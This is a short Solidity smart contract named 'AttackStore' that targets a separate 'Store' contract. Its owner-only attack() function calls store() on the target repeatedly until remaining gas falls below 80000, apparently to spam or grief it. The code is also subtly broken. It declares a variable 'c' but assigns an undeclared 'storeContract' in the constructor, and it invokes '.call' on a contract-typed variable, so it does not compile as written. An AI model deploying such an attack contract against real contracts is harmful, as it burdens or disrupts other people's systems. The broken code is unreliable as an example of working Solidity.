// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./Store.sol";

contract AttackStore is Ownable {
    Store c;

    constructor(Store _contractAddress) {
        storeContract = Store(_contractAddress);
    }

    function deposit() public payable {}

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function attack() public onlyOwner {
        do {
            (bool success, ) =
                c.call{value: 0}(abi.encodeWithSignature("store()"));
            require(success, "Attack failed");
        } while (gasleft() > 80000);
    }

    receive() external payable {}
}
